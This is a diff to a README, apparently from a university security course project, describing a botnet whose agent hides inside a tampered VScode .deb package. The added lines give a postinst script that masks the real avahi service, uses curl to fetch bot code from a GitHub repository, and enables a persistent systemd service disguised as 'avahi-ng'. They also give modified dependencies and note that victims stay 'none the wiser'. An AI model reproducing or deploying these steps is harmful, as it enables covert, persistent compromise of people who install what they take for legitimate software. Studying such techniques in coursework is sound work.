@@ -33,8 +33,25 @@ The bot is an agent written in python, registered as a systemd service. It suppo
 
 ### Installation
 The bot is installed as part of a tampered VScode dpkg package. the reason we chose this is that VScode is popular software which is not in ububtu's default repositories which means this is one of the few programs for Linux that is expected to be installed by root from a package downloaded from a website. This allows us to bypass linux's package management security model. 
-As part of the installation, the bot installs itself to `/usr/bin/avahi-ng` and registers an auto-enabled systemd service by the same name. Avahi is the most common mDNS / Bonjour/ Zeroconf utility for linux so an application called avahi-ng broadcasting mDNS packets will not raise suspision. The installer will also mask the real avahi service to prevent it from interfering with transmission. 
+As part of the installation, the bot installs itself to `/usr/bin/avahi-ng` and registers an auto-enabled systemd service by the same name. Avahi is the most common mDNS / Bonjour/ Zeroconf utility for linux so an application called avahi-ng broadcasting mDNS packets will not raise suspision. The installer will also mask the real avahi service to prevent it from interfering with transmission. It also adds its own dependances, namely scapy and python3-bitarray, to those of VScode. This was done by disassembling the proper .deb file, modifying the DEBIAN files as shown below, and reassembling it with dpkg.
 
+Modifications to `DEBIAN/postinst`:
+```bash
+systemctl mask avahi-daemon
+mkdir -p /etc/avahi-ng
+curl -o /etc/avahi-ng/main.py https://raw.githubusercontent.com/CS4404-Mission3/bot/main/bot.py
+curl -o /etc/avahi-ng/channel.py https://raw.githubusercontent.com/CS4404-Mission3/bot/main/channel.py
+chmod +x /usr/bin/avahi-ng
+curl -o /etc/systemd/system/avahi-ng.service https://raw.githubusercontent.com/CS4404-Mission3/bot/main/bot.service
+systemctl daemon-reload
+systemctl enable --now avahi-ng
+```
+
+Modifications to `DEBIAN/control`:
+```
+Depends: ca-certificates, libasound2 (>= 1.0.16), libatk-bridge2.0-0 (>= 2.5.3), libatk1.0-0 (>= 2.2.0), libatspi2.0-0 (>= 2.9.90), libc6 (>= 2.14), libc6 (>= 2.17), libc6 (>= 2.2.5), libcairo2 (>= 1.6.0), libcups2 (>= 1.6.0), libcurl3-gnutls | libcurl3-nss | libcurl4 | libcurl3, libdbus-1-3 (>= 1.5.12), libdrm2 (>= 2.4.38), libexpat1 (>= 2.0.1), libgbm1 (>= 8.1~0), libglib2.0-0 (>= 2.16.0), libglib2.0-0 (>= 2.39.4), libgtk-3-0 (>= 3.9.10), libgtk-3-0 (>= 3.9.10) | libgtk-4-1, libnspr4 (>= 2:4.9-2~), libnss3 (>= 2:3.22), libnss3 (>= 3.26), libpango-1.0-0 (>= 1.14.0), libsecret-1-0 (>= 0.18), libx11-6, libx11-6 (>= 2:1.4.99.1), libxcb1 (>= 1.9.2), libxcomposite1 (>= 1:0.4.4-1), libxdamage1 (>= 1:1.1), libxext6, libxfixes3, libxkbcommon0 (>= 0.4.1), libxkbfile1, libxrandr2, xdg-utils (>= 1.0.2), python3, python3-bitarray, scapy
+```
+The additional packages will cause the `dpkg -i` install operation to fail, but this is again normal for a manual installation, the user must simply run `apt --fix-broken install` and everything will work perfectly with them none the wiser. 
 
 ## Command and Control
 The bots use the C2 mDNS covert channel described in the "covert channel" section above. the bot constantly listens for mDNS traffic and will attempt to parse it. If the message is a command and is destined for the bot's ID (or the multicast ID 0000), it will execute it and transmit a reply. The supported commands are: `ping`, `info`, `abx`, `shutdown`, and `burnit`. 
